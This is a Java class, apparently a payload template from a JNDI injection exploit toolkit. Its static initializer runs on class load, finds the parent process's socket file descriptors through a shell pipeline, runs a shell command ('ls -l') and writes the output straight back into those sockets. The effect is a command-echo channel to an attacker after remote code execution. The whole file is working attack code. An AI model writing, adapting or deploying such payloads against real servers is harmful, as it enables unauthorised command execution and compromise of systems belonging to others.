package com.qi4l.jndi.template.echo;

public class LinuxEcho1 {

    static {
        try {
            String command  = "ls -l /proc/$PPID/fd|grep socket:|awk '{print $9}'";

            java.util.List<String> list = new java.util.ArrayList<>();
            String[] cmd = new String[]{"/bin/sh", "-c", command };
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));

            String line;
            while ((line = br.readLine()) != null){
                list.add(line);
            }

            br.close();

            java.lang.reflect.Constructor<java.io.FileDescriptor> c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
            c.setAccessible(true);

            for(String s : list){
                Integer integer = Integer.parseInt(s);

                try{
                    cmd = new String[]{"/bin/sh", "-c", "ls -l" };
                    br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));

                    StringBuilder sb = new StringBuilder();
                    while ((line = br.readLine()) != null){
                        sb.append(line + "\n");
                    }

                    java.io.FileOutputStream os = new java.io.FileOutputStream(c.newInstance(integer));
                    os.write(sb.toString().getBytes());

                    br.close();
                    os.close();
                }catch(Exception e){}
            }
        } catch (Exception ignored) {
        }

    }

}
